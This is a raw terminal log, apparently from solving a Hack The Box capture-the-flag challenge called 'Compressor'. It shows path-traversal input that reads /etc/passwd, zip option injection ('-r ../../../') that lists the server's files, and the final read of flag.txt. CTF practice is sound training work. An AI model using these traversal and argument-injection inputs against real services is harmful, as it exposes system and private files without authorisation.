root@656f57f561b7 /s/g/I/P/c/2/H/F/Automation# nc 157.245.33.77 31732                                                                     130 main
# Compressor

[*] Directory to work in: QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB

Component List:

+===============+
|               |
|  1. Head  🤖  |
|  2. Torso 🦴   |
|  3. Hands 💪  |
|  4. Legs  🦵   |
|               |
+===============+

[*] Choose component: 1

[*] Sub-directory to work in: QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB/Head


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../../../etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
utmp:x:100:406:utmp:/home/utmp:/bin/false
ctf:x:1000:1000:1000:/home/ctf:/bin/sh

-----------

Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 1


Insert name: ../

Insert content: #!/bin/bash
Traceback (most recent call last):
  File "/home/ctf/artifacts.py", line 104, in <module>
    create_file()
  File "/home/ctf/artifacts.py", line 74, in create_file
    f = open(fname, "a")
IsADirectoryError: [Errno 21] Is a directory: '../'


Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 4


Insert <name>.zip: test.zip
Insert <name>: test
Insert <options>: -r ../../../
  adding: test (stored 0%)
  adding: ../../../ (stored 0%)
  adding: ../../../ctf/ (stored 0%)
  adding: ../../../ctf/68ubJQ7pIAFQ3AR5XmnIIyNFlMKU5EXd/ (stored 0%)
  adding: ../../../ctf/68ubJQ7pIAFQ3AR5XmnIIyNFlMKU5EXd/Head/ (stored 0%)
  adding: ../../../ctf/68ubJQ7pIAFQ3AR5XmnIIyNFlMKU5EXd/Hands/ (stored 0%)
  adding: ../../../ctf/68ubJQ7pIAFQ3AR5XmnIIyNFlMKU5EXd/Torso/ (stored 0%)
  adding: ../../../ctf/68ubJQ7pIAFQ3AR5XmnIIyNFlMKU5EXd/Legs/ (stored 0%)
  adding: ../../../ctf/EpC4PRCjCI6UqE18aUIiUvFpCVgtiHQ6/ (stored 0%)
  adding: ../../../ctf/EpC4PRCjCI6UqE18aUIiUvFpCVgtiHQ6/Head/ (stored 0%)
  adding: ../../../ctf/EpC4PRCjCI6UqE18aUIiUvFpCVgtiHQ6/Hands/ (stored 0%)
  adding: ../../../ctf/EpC4PRCjCI6UqE18aUIiUvFpCVgtiHQ6/Torso/ (stored 0%)
  adding: ../../../ctf/EpC4PRCjCI6UqE18aUIiUvFpCVgtiHQ6/Legs/ (stored 0%)
  adding: ../../../ctf/EpC4PRCjCI6UqE18aUIiUvFpCVgtiHQ6/Legs/test (stored 0%)
  adding: ../../../ctf/Hd5An501jos12kmr6khg0Jwqtyy1jRTm/ (stored 0%)
  adding: ../../../ctf/Hd5An501jos12kmr6khg0Jwqtyy1jRTm/Head/ (stored 0%)
  adding: ../../../ctf/Hd5An501jos12kmr6khg0Jwqtyy1jRTm/Hands/ (stored 0%)
  adding: ../../../ctf/Hd5An501jos12kmr6khg0Jwqtyy1jRTm/Torso/ (stored 0%)
  adding: ../../../ctf/Hd5An501jos12kmr6khg0Jwqtyy1jRTm/Legs/ (stored 0%)
  adding: ../../../ctf/t4oOfFbu85iTriXS82wQvhLrOgKFElwK/ (stored 0%)
  adding: ../../../ctf/t4oOfFbu85iTriXS82wQvhLrOgKFElwK/Head/ (stored 0%)
  adding: ../../../ctf/t4oOfFbu85iTriXS82wQvhLrOgKFElwK/Hands/ (stored 0%)
  adding: ../../../ctf/t4oOfFbu85iTriXS82wQvhLrOgKFElwK/Torso/ (stored 0%)
  adding: ../../../ctf/t4oOfFbu85iTriXS82wQvhLrOgKFElwK/Legs/ (stored 0%)
  adding: ../../../ctf/bcAV066lZgSOORQwxDo2Ni1QL3EibKsT/ (stored 0%)
  adding: ../../../ctf/bcAV066lZgSOORQwxDo2Ni1QL3EibKsT/Head/ (stored 0%)
  adding: ../../../ctf/bcAV066lZgSOORQwxDo2Ni1QL3EibKsT/Hands/ (stored 0%)
  adding: ../../../ctf/bcAV066lZgSOORQwxDo2Ni1QL3EibKsT/Torso/ (stored 0%)
  adding: ../../../ctf/bcAV066lZgSOORQwxDo2Ni1QL3EibKsT/Legs/ (stored 0%)
  adding: ../../../ctf/1RtEyWs5veSXrP6FkfIWcMvzv9I4fLsk/ (stored 0%)
  adding: ../../../ctf/1RtEyWs5veSXrP6FkfIWcMvzv9I4fLsk/Head/ (stored 0%)
  adding: ../../../ctf/1RtEyWs5veSXrP6FkfIWcMvzv9I4fLsk/Hands/ (stored 0%)
  adding: ../../../ctf/1RtEyWs5veSXrP6FkfIWcMvzv9I4fLsk/Torso/ (stored 0%)
  adding: ../../../ctf/1RtEyWs5veSXrP6FkfIWcMvzv9I4fLsk/Legs/ (stored 0%)
  adding: ../../../ctf/TiweCMr7bSMcAXuvbIqr5DnhOIJLRQv2/ (stored 0%)
  adding: ../../../ctf/TiweCMr7bSMcAXuvbIqr5DnhOIJLRQv2/Head/ (stored 0%)
  adding: ../../../ctf/TiweCMr7bSMcAXuvbIqr5DnhOIJLRQv2/Hands/ (stored 0%)
  adding: ../../../ctf/TiweCMr7bSMcAXuvbIqr5DnhOIJLRQv2/Torso/ (stored 0%)
  adding: ../../../ctf/TiweCMr7bSMcAXuvbIqr5DnhOIJLRQv2/Legs/ (stored 0%)
  adding: ../../../ctf/aPstJ5uVrTDkDnjPpdTaxRpHS1BmmKvT/ (stored 0%)
  adding: ../../../ctf/aPstJ5uVrTDkDnjPpdTaxRpHS1BmmKvT/Head/ (stored 0%)
  adding: ../../../ctf/aPstJ5uVrTDkDnjPpdTaxRpHS1BmmKvT/Hands/ (stored 0%)
  adding: ../../../ctf/aPstJ5uVrTDkDnjPpdTaxRpHS1BmmKvT/Torso/ (stored 0%)
  adding: ../../../ctf/aPstJ5uVrTDkDnjPpdTaxRpHS1BmmKvT/Legs/ (stored 0%)
  adding: ../../../ctf/blwvpiVBxCRu7bbeQwTEyYheCT9p6dFw/ (stored 0%)
  adding: ../../../ctf/blwvpiVBxCRu7bbeQwTEyYheCT9p6dFw/Head/ (stored 0%)
  adding: ../../../ctf/blwvpiVBxCRu7bbeQwTEyYheCT9p6dFw/Hands/ (stored 0%)
  adding: ../../../ctf/blwvpiVBxCRu7bbeQwTEyYheCT9p6dFw/Torso/ (stored 0%)
  adding: ../../../ctf/blwvpiVBxCRu7bbeQwTEyYheCT9p6dFw/Legs/ (stored 0%)
  adding: ../../../ctf/YYscAtpfKpNnkxtRdy4nZKcjxg5Tskoh/ (stored 0%)
  adding: ../../../ctf/YYscAtpfKpNnkxtRdy4nZKcjxg5Tskoh/Head/ (stored 0%)
  adding: ../../../ctf/YYscAtpfKpNnkxtRdy4nZKcjxg5Tskoh/Hands/ (stored 0%)
  adding: ../../../ctf/YYscAtpfKpNnkxtRdy4nZKcjxg5Tskoh/Torso/ (stored 0%)
  adding: ../../../ctf/YYscAtpfKpNnkxtRdy4nZKcjxg5Tskoh/Legs/ (stored 0%)
  adding: ../../../ctf/c9uFl1LTbTqSpnpqa9PkRDJFXRiWd1uQ/ (stored 0%)
  adding: ../../../ctf/c9uFl1LTbTqSpnpqa9PkRDJFXRiWd1uQ/Head/ (stored 0%)
  adding: ../../../ctf/c9uFl1LTbTqSpnpqa9PkRDJFXRiWd1uQ/Hands/ (stored 0%)
  adding: ../../../ctf/c9uFl1LTbTqSpnpqa9PkRDJFXRiWd1uQ/Torso/ (stored 0%)
  adding: ../../../ctf/c9uFl1LTbTqSpnpqa9PkRDJFXRiWd1uQ/Legs/ (stored 0%)
  adding: ../../../ctf/QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB/ (stored 0%)
  adding: ../../../ctf/QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB/Head/ (stored 0%)
  adding: ../../../ctf/QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB/Hands/ (stored 0%)
  adding: ../../../ctf/QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB/Torso/ (stored 0%)
  adding: ../../../ctf/QqcbsvCcKGxpk7n6JNvqNxPB19gC5OiB/Legs/ (stored 0%)
  adding: ../../../ctf/F9mZ4CfUW9NVXjEwShKzvoNYhq7DNwIb/ (stored 0%)
  adding: ../../../ctf/F9mZ4CfUW9NVXjEwShKzvoNYhq7DNwIb/Head/ (stored 0%)
  adding: ../../../ctf/F9mZ4CfUW9NVXjEwShKzvoNYhq7DNwIb/Hands/ (stored 0%)
  adding: ../../../ctf/F9mZ4CfUW9NVXjEwShKzvoNYhq7DNwIb/Torso/ (stored 0%)
  adding: ../../../ctf/F9mZ4CfUW9NVXjEwShKzvoNYhq7DNwIb/Legs/ (stored 0%)
  adding: ../../../ctf/artifacts.py (deflated 63%)
  adding: ../../../ctf/clear.py (deflated 32%)
  adding: ../../../ctf/flag.txt (stored 0%)

Actions:

1. Create artifact
2. List directory    (pwd; ls -la)
3. Read artifact     (cat ./<name>)
4. Compress artifact (zip <name>.zip <name> <options>)
5. Change directory  (cd <dirname>)
6. Clean directory   (rm -rf ./*)
7. Exit

[*] Choose action: 3


Insert name you want to read: ../../../ctf/flag.txt
HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}